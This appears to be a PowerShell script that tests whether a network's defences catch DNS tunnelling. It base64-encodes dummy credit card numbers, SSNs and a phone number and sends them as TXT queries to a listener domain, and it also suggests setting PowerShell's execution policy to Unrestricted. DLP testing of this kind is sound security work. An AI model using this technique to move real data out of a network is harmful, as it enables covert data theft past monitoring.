#LeakyFaucet v1.04.1
#Written: Mr.Waterhouse
#May 2, 2023
#
#This DNS tunnelling script created as part of a fun little side project. It is designed to quickly test if DNS tunnelling is possible
#in the environment. Simply put, is your existing security stack doing what it is supposed to do? It also has the ability to embed
#commands (in the form of server-side bash shell calls).
#
#Usage: .\leakyfaucet_1.04.1.ps1 "phoneNumber" "domain" "OPTIONAL_COMMAND"  <-- There must be a bash shell with the same name (.sh not required) on the server.
#ie. .\leakyfaucet_1.04.1.ps1 "15555555555" "sampledomain.xyz"
#
#The phone number MUST have a leading 1 for country code. Eventually I'll get around to coding a check and adding in the country code if
#it is missing but for now it will not work without it. More specifically, this script will still encode and send, but the server will not
#accept it in the wrong format. So if all you want to do is generate dns tunnel traffic, you can put in whatever you want as the phoneNumber
#argument at the cli.
#
#Prerequisites: This is a powershell script so.....powershell.
#I've only tested this script in Windows 11 running PS 5.1 Build 22621 Rev 963. You may also need to ensure ExecutionPolicy allows you to actually run
#ps1 scripts. You can try:  Set-ExecutionPolicy -ExecutionPolicy UnRestricted -Scope CurrentUser Just remember to set it back to it's original setting
#when you are finished or you will allow all ps1 scripts to run for CurrentUser. 
#
#Acknowledgements: I code like a 5th grader, so any time I got stuck I would search in reddit for ideas. As a last resort, I'd hit up
#ChatGPT and it would usually set me on a better path. The sample CC and PII data is also sources from www.dlptest.com.

#Define cli parameters
param (
   [Parameter(Mandatory=$true)]
   [string]$cli_phone,
   [Parameter(Mandatory=$true)]
   [string]$cli_domain,
   [Parameter(Mandatory=$false)]
   [string]$cli_command
)
#Assign x to $cli_command if an argument was not present
if ($cli_command -eq $null -or $cli_command -eq "") {
    $cli_command = "x"
}

# Generate a random 5-digit number to act as session id. This is required by the listener in order to differentiate traffic from multiple
#users.
$ranNum = Get-Random -Minimum 10000 -Maximum 99999

#Assign Variables - You can adjust all of these. DO NOT put real credit cards and PII in here. That is idiotic! If you do, you will actually
#be leaking sensitive data. Any traffic received by my server is wiped every two hours. No exceptions!

$listener_domain = $cli_domain
$phone_number = $ranNum.ToString() + $cli_phone
$credit_card_1 = $ranNum.ToString() + '4916-4034-9269-8783 1/8/2024'
$credit_card_2 = $ranNum.ToString() + '5548-0246-6336-5664 1/6/2026'
$ssn_1 = $ranNum.ToString() + 'Rick Edwards 612-20-6832'
$ssn_2 = $ranNum.ToString() + 'Mark Hall 449-48-3135'

#Check that each variable character length is 36.
#If it is not, pad the end with the required amount of 'x' to make it so.
#This is to ensure the base64 encoder does not create variables with '==' in them. = is not a valid DNS character.
$dns_data = @($phone_number, $credit_card_1, $credit_card_2, $ssn_1, $ssn_2)
foreach ($i in 0..($dns_data.Length - 1)) {
    $var = $dns_data[$i].Trim()
    Write-Output $var
    $var_length = $var.Length
    if ($var_length -lt 36) {
        $var = $var + ('x' * (36 - $var_length))
        #Write-Output "Padded" $var     #use for debugging
        $dns_encoded = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($var))
        #Write-Output "Encoded" $dns_encoded             #use for debugging
    }
    $dns_data[$i] = $dns_encoded
}

#Loop to run DNS queries over a period of 15 seconds per query.(10 seconds for timeout, 5 sleep)
foreach ($value in $dns_data) {
    $dns_query = $value + '.' + $listener_domain
    Write-Output "Performing NSLOOKUP type=TXT for: $dns_query"
    try {
        $answers = Resolve-DnsName -Name $dns_query -Type TXT -ErrorAction SilentlyContinue
        foreach ($rdata in $answers) {
            foreach ($txt_string in $rdata.Strings) {
                [System.Text.Encoding]::UTF8.GetString($txt_string)
            }
        }
    } catch [System.Management.Automation.DnsNotFoundException] {
        Write-Output "The domain you specified does not exist."
    } catch [System.Management.Automation.DnsNoAnswerException] {
        Write-Output "Checking my pockets for data."
    } catch [System.Management.Automation.DnsQueryTimeoutException] {
        Write-Output "I fell asleep waiting for a server reply."
    } catch [System.Management.Automation.DnsServerUnavailableException] {
        Write-Output "No name server found."
    }
    Start-Sleep -Seconds 5  #Adjust drip speed here
}  

#Display session ID for server-side debugging purposes.
Write-Output "SESSION ID:" $ranNum
